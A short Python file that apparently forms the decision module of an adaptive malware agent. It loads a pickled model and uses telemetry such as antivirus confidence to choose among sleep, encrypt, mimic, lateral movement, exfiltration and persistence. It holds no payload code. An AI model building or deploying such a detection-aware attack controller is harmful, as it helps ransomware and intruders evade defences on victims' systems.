import pickle
import numpy as np
import os


class Predictor:
    def __init__(self):
        self.model = self._load_model()

    def _load_model(self):
        base_dir = os.path.dirname(os.path.abspath(__file__))
        model_path = os.path.join(base_dir, "saved", "final_agent.pkl")

        if os.path.exists(model_path):
            try:
                with open(model_path, "rb") as f:
                    return pickle.load(f)
            except Exception:
                return None

        return None

    def predict(self, telemetry: dict) -> tuple:
        """Predict optimal action"""

        if not self.model:
            return "sleep", 0.5

        state = np.array([
            telemetry.get('av_confidence', 0.5),
            telemetry.get('network_activity', 0.1),
            telemetry.get('process_count', 10),
            telemetry.get('disk_usage', 0.3)
        ], dtype=np.float32)

        try:
            action, confidence = self.model.predict(state)
        except Exception:
            return "sleep", 0.5

        action_names = [
            "sleep",
            "encrypt",
            "mimic",
            "lateral",
            "exfil",
            "persist"
        ]

        # ✅ safety guard
        if action >= len(action_names):
            action = 0

        return action_names[action], float(confidence)
